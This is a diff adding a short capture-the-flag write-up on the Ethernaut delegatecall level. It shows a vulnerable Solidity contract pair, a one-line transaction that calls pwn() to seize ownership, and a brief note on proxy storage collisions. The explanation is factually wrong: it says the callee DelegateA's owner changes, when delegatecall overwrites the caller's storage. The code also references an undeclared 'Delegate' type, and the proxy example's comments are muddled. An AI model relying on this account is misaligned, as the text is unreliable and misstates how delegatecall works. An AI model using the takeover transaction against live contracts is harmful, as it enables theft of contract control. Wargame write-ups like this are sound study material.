@@ -1,0 +1,77 @@
+---
+title: Solidity Delegatecall Attack
+description: Solidity’s delegatecall is vulnerable to override the storage values in the caller contract.
+tags:
+    - Blockchain
+    - Ethereum
+refs:
+    - https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78
+date: 2023-09-30
+draft: false
+---
+
+## Exploitation
+
+Reference: [https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md](https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md)
+
+### 1. Vulnerable Contract
+
+Below is the example contracts from **Ethernaut**. That uses `delegatecall` method in the `fallback()` function.
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract DelegateA {
+  address public owner;
+
+  constructor(address _owner) {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract DelegateB {
+    address public owner;
+    DelegateA delegateA;
+
+    constructor(address _delegateA) {
+        delegateA = Delegate(_delegateA);
+        owner = msg.sender;
+    }
+
+    fallback() external {
+        (bool result,) = address(delegateA).delegatecall(msg.data);
+        if (result) {
+            this;
+        }
+    }
+}
+```
+
+### 2. Attack
+
+Call the `pwn` function by sending transaction because `delegatecall` exists in `fallback` function. This changes the owner of the **DelegateA** contract to `msg.sender` because the `delegatecall` overrides the slot value in the callee contract (it's **DelegateA**). In short, we can become the owner of this contract.
+
+```js
+contract.sendTransaction({data: web3.sha3('pwn()').slice(0, 10)})
+```
+
+<br />
+
+## Upgradeable Contract Storage Overriding
+
+If the contract is upgradeable using Proxy contract and the slot order is difference, we may be able to manipulate arbitrary slot values with delegatecall.
+
+```js
+contract ExampleV1 {
+	uint public balance; // <- we can overwrite this from the ExampleV2 contract
+}
+
+contract ExampleV2 {
+	address public owner; // <- we can overwrite this from the ExampleV1 contract
+}
+```
